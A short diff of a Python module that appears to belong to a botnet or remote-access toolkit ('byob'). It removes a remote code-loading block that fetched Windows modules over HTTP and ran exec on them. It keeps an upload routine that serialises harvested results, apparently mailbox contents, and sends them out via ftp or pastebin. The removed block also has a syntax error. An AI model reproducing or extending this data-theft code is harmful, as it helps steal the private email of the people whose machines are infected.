@@ -7,24 +7,17 @@ Copyright (c) 2018 Daniel Vega-Myhre
 from __future__ import print_function
 
 # standard library
+
 import os
 import sys
 import json
 
-# byob
+# modules
 
 import util
 
-# remote imports
-with httpimport.remote_repo(['win32com','pythoncom'], base_url='http://localhost:8000'):
-        for module in ['win32com','pythoncom']:
-            try:
-                exec "import %s" in globals()
-            except ImportError:
-                util.debug("Error: unable to import '%s'" % module
-
-
-results = {}
+packages = ['win32comext.client','pythoncom']
+results  = {}
 
 
 def installed():
@@ -85,7 +78,7 @@ def upload(mode):
             if not len(results):
                 _ = inbox()
             output = json.dumps(result, indent=2)
-            if hasattr(util, mode):
+            if mode in ('ftp','pastebin'):
                 return getattr(util, mode)(output)
             else:
                 return "Error: invalid upload mode"
